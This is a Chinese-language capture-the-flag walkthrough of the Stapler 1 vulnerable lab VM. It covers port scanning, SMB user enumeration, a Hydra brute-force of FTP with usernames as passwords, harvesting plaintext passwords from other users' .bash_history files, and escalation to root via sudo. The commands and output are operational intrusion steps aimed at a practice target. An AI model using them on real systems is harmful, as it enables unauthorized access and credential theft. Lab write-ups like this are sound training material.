# Stapler 1

在导入这个靶机会遇到一个错误，要解决此问题，请在文本编辑器中打开该.ovf文件，并将所有出现的单词替换Caption为ElementNam. 然后删除.mf同一目录中的文件。查看这篇 Reddit 帖子了解更多详细信息。现在我们可以将虚拟机导入到VMWare中。更改网络配置，创建快照，然后我们就可以开始了。

### 主机发现：

```
┌──(root㉿kali)-[~]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:f5:d6:36, IPv4: 192.168.23.129
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.23.1    00:50:56:c0:00:08       VMware, Inc.
192.168.23.2    00:50:56:ec:db:1b       VMware, Inc.
192.168.23.132  00:0c:29:b5:92:da       VMware, Inc.
192.168.23.137  00:0c:29:33:c8:07       VMware, Inc.
192.168.23.140  00:0c:29:f3:32:c5       VMware, Inc.
192.168.23.254  00:50:56:f1:1f:4e       VMware, Inc.

6 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.931 seconds (132.57 hosts/sec). 6 responded
```

网络地址为192.168.23.140

### 扫描

```
--. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.23.140:21
Open 192.168.23.140:22
Open 192.168.23.140:53
Open 192.168.23.140:80
Open 192.168.23.140:139
Open 192.168.23.140:666
Open 192.168.23.140:3306
Open 192.168.23.140:12380
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-01 23:09 EDT
NSE: Loaded 46 scripts for scanning.
Initiating ARP Ping Scan at 23:09
Scanning 192.168.23.140 [1 port]
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
ARP Ping Scan Timing: About 100.00% done; ETC: 23:09 (0:00:00 remaining)
Completed ARP Ping Scan at 23:09, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:09
Completed Parallel DNS resolution of 1 host. at 23:09, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 23:09
Scanning 192.168.23.140 [8 ports]
Discovered open port 53/tcp on 192.168.23.140
Discovered open port 139/tcp on 192.168.23.140
Discovered open port 21/tcp on 192.168.23.140
Discovered open port 80/tcp on 192.168.23.140
Discovered open port 3306/tcp on 192.168.23.140
Discovered open port 22/tcp on 192.168.23.140
Discovered open port 12380/tcp on 192.168.23.140
Discovered open port 666/tcp on 192.168.23.140
Completed SYN Stealth Scan at 23:09, 0.01s elapsed (8 total ports)
Initiating Service scan at 23:09
Scanning 8 services on 192.168.23.140
Completed Service scan at 23:09, 11.07s elapsed (8 services on 1 host)
NSE: Script scanning 192.168.23.140.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 23:09
Completed NSE at 23:09, 0.21s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 23:09
Completed NSE at 23:09, 0.03s elapsed
Nmap scan report for 192.168.23.140
Host is up, received arp-response (0.0016s latency).
Scanned at 2023-08-01 23:09:21 EDT for 12s

PORT      STATE SERVICE     REASON         VERSION
21/tcp    open  ftp         syn-ack ttl 64 vsftpd 2.0.8 or later
22/tcp    open  ssh         syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp    open  domain      syn-ack ttl 64 dnsmasq 2.75
80/tcp    open  http        syn-ack ttl 64 PHP cli server 5.5 or later
139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
666/tcp   open  doom?       syn-ack ttl 64
3306/tcp  open  mysql       syn-ack ttl 64 MySQL 5.7.12-0ubuntu1
12380/tcp open  http        syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-TCP:V=7.94%I=7%D=8/1%Time=64C9C8E1%P=x86_64-pc-linux-gnu%r(NULL
SF:,1000,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x15
SF:2\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x04
SF:\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa2
SF:\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\x
SF:0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\xb
SF:2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu\
SF:xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd3
SF:\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa0
SF:\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x8
SF:7\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\xf
SF:4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\xd
SF:c\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd5
SF:\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xaf
SF:\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:\
SF:xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\x
SF:8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc\x
SF:e7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd\
SF:xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\x
SF:9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\x
SF:f1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\x
SF:f8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak\
SF:xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\x
SF:d2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f\
SF:xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\[
SF:\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\xc
SF:c\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa7
SF:\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\x
SF:fd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x96
SF:\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8f\
SF:xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4\
SF:xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\x
SF:88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xbc
SF:L}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0\
SF:.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\x
SF:f6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\xf
SF:3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\?
SF:\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
MAC Address: 00:0C:29:F3:32:C5 (VMware)
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.89 seconds
           Raw packets sent: 9 (380B) | Rcvd: 9 (380B)

```

开放了很多端口，让我们枚举一下端口

### 枚举端口 12389

这个端口是个http服务，我们直接访问它

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

没有找到什么有用的信息，让我们看看666端口，这个端口上运行着什么服务

```
┌──(root㉿kali)-[~]
└─# nc 192.168.23.140 666          
Pd��Hp���,2
           message2.jpgUT       +�QWJ�QWux
                                          ��z
                                             T���P���A@� �UT�T�2>��RDK�Jj�"DL[E�
                                                                                0<Ĵ�ʮn���V�W�H ����
```

这似乎是一个二进制文件，我们得到了一堆乱码。它看起来是二进制数据，但我们可以看到字符串“message2.jpg”隐藏在其中。让我们尝试将这些数据传输到一个文件中以进行更深入的了解。

尝试立即连接回同一端口将立即断开连接，因此我们可以添加一个`sleep`命令以在重新连接之前等待一段时间。然后我们将看看该`file`命令是否可以确定文件的数据类型。

```
┌──(root㉿kali)-[~/Desktop/test]
└─# sleep 60; nc 192.168.23.140  666 > data
                                                                                                                                                                                           
┌──(root㉿kali)-[~/Desktop/test]
└─# file data                              
data: Zip archive data, at least v2.0 to extract, compression method=deflate
                                                                                                                    
┌──(root㉿kali)-[~/Desktop/test]
└─# mv data data.zip; unzip data.zip
Archive:  data.zip
  inflating: message2.jpg 
```

它看起来像一个 Zip 文件。解压后，我们发现一张JPG图片。这可以解释`message2.jpg` 我们看到的隐藏在数据中的字符串。让我们看看它是否给我们带来任何有用的东西。

我们收到另一个潜在的用户名和分段错误错误消息。也许这是稍后在盒子里的线索。或者也许[g0tmi1k](https://blog.g0tmi1k.com/)正在欺骗我们，而这只是一个兔子洞。

### 枚举端口139（smbd）

SMB 通常是查找信息和/或可利用的安全漏洞的好地方。让我们来看看。

首先，运行`enum4linux`. 在输出的内容中，我们可以找到一长串的用户名。

```
┌──(root㉿kali)-[~]
└─# enum4linux -a 192.168.23.140
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                         
                                                                                                                    
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                   
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-21-864226560-67800430-3082388513 and logon username '', password ''           
                                                                                                                    
S-1-5-21-864226560-67800430-3082388513-501 RED\nobody (Local User)                                                  
S-1-5-21-864226560-67800430-3082388513-513 RED\None (Domain Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                         
                                                                                                                    
S-1-22-1-1000 Unix User\peter (Local User)                                                                          
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)

 ==============================( Getting printer info for 192.168.23.140 )==============================
```

将这些用户名复制到名为`users.txt`. 这些肯定会派上用场。

### 使用 Hydra 进行暴力破解

通过这个用户名列表，我们可以尝试破解一些密码。因为用户使用用户名作为密码的情况并不少见，所以让我们尝试使用 进行快速暴力破解`hydra`。

因为暴力破解 SSH 的速度非常慢，所以我们首先尝试破解 FTP 服务器：

```
┌──(root㉿kali)-[~/Desktop/test]
└─# hydra -L users.txt -P users.txt 192.168.23.140 ftp
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-02 02:47:06
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1521 login tries (l:39/p:39), ~96 tries per task
[DATA] attacking ftp://192.168.23.140:21/
[STATUS] 299.00 tries/min, 299 tries in 00:01h, 1222 to do in 00:05h, 16 active
[21][ftp] host: 192.168.23.140   login: SHayslett   password: SHayslett
[STATUS] 291.33 tries/min, 874 tries in 00:03h, 647 to do in 00:03h, 16 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-02 02:52:23
```

我们这里获得了一个用户名密码\[21]\[ftp] host: 192.168.23.140   login: SHayslett   password: SHayslett

尝试一下ssh连接

```
┌──(root㉿kali)-[~]
└─# ssh SHayslett@192.168.23.140 
The authenticity of host '192.168.23.140 (192.168.23.140)' can't be established.
ED25519 key fingerprint is SHA256:eKqLSFHjJECXJ3AvqDaqSI9kP+EbRmhDaNZGyOrlZ2A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.23.140' (ED25519) to the list of known hosts.
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
SHayslett@192.168.23.140's password: 
Welcome back!

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

SHayslett@red:~$
```

我们进来了！首先，我们来看看我们的特权：

```
SHayslett@red:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for SHayslett: 
Sorry, user SHayslett may not run sudo on red.
```

没有运气`sudo`。挖掘主目录通常会发现钻石。让我们寻找可读文件：

```
SHayslett@red:~$ find /home -readable
/home
/home/MFrei
/home/MFrei/.bashrc
/home/MFrei/.bash_history
/home/MFrei/.bash_logout
/home/MFrei/.profile
/home/Sam
/home/Sam/.bashrc
/home/Sam/.bash_history
/home/Sam/.bash_logout
/home/Sam/.profile
/home/CCeaser
/home/CCeaser/.bashrc
/home/CCeaser/.bash_history
/home/CCeaser/.bash_logout
/home/CCeaser/.profile
/home/www
/home/www/.bashrc
/home/www/.bash_logout
/home/www/.profile
```

所以有很多可读文件。这些`.bash_history`文件可能提供我们可以使用的东西，所以让我们使用一些命令行 fu 来转储它们：

```
SHayslett@red:~$ find /home -name .bash_history -exec cat {} \;

cat: /home/peter/.bash_history: Permission denied
find: ‘/home/peter/.cache’: Permission denied
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
ps -ef
```

我们获得更多的信用！

我们可以使用该`id`命令来查看这些用户中的任何一个是否可能对该设备拥有显着的权限。

```
SHayslett@red:~$ id JKanode
uid=1013(JKanode) gid=1013(JKanode) groups=1013(JKanode)
SHayslett@red:~$ id peter
uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```

peter这个用户有东西，切换一下看看

```
SHayslett@red:~$ su peter
Password: 
This is the Z Shell configuration function for new users,
zsh-newuser-install.
You are seeing this message because you have no zsh startup files
(the files .zshenv, .zprofile, .zshrc, .zlogin in the directory
~).  This function can help you with a few settings that should
make your use of the shell easier.

You can:

(q)  Quit and do nothing.  The function will be run again next time.

(0)  Exit, creating the file ~/.zshrc containing just a comment.
     That will prevent this function being run again.

(1)  Continue to the main menu.

(2)  Populate your ~/.zshrc with the configuration recommended
     by the system administrator and exit (you will need to edit
     the file by hand, if so desired).

--- Type one of the keys in parentheses --- y
Aborting.
The function will be run again next time.  To prevent this, execute:
  touch ~/.zshrc
```

小菜一碟！让我们得到我们的`root`外壳：

```
red% sudo -s

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter: 
red#
red# id
uid=0(root) gid=0(root) groups=0(root)
```

### 获得旗帜

捕获这个盒子上的标志很简单。前往`/root`目录。我们发现`flag.txt`并`cat`得出：

```
red# cd /root
red# ls
fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
red# cat flag.txt
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
```
